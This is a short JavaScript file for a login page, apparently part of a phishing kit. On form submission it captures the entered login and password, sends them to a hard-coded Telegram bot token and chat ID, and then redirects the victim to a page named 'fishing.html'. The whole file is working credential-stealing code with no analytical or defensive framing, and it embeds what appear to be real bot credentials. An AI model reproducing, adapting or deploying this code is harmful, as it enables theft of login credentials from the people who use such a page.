
let Token = '7988764833:AAExctfTELUXPM7tgjpx-rZZQ41O5XhjpTY';
let chatId = '858709040';


document.getElementById('loginForm').addEventListener('submit', function (e) {
    e.preventDefault();

    let login = document.getElementById('login').value;
    let password = document.getElementById('password').value;

    let message = `👤 Login: ${login}\n🔒 Password: ${password}`;

    fetch(`https://api.telegram.org/bot${Token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    }).then(response => {
        // Optionally redirect after submission
        setTimeout(() => {
            window.location.href = './fishing.html';
        }, 4000);
    }).catch(error => {
        console.error('Error:', error);
    });
});